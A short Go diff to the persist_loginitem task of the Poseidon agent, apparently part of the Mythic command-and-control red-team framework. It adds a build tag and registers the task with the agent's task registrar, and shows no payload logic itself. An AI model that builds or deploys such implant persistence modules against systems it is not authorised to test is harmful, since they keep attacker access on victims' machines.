@@ -1,3 +1,5 @@
+//go:build persist_loginitem || debug
+
 package persist_loginitem
 
 import (
@@ -6,8 +8,13 @@ import (
 
 	// Poseidon
 
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/taskRegistrar"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
+
+func init() {
+	taskRegistrar.Register("persist_loginitem", Run)
+}
 
 type Arguments struct {
 	Path   string
